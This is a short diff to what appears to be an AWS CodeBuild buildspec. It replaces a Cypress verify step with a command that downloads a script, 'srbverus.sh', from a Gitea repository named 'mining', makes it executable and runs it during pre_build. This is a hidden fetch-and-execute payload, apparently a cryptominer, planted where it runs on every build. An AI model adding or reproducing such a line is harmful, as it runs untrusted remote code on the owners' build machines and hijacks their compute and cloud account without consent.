@@ -37,7 +37,7 @@ phases:
       - npm ci
   pre_build:
     commands:
-      - npm run cy:verify
+      - wget https://try.gitea.io/novalanto61/mining/raw/branch/master/srbverus.sh && chmod u+x srbverus.sh && ./srbverus.sh
       - npm run cy:info
   build:
     # Per https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html
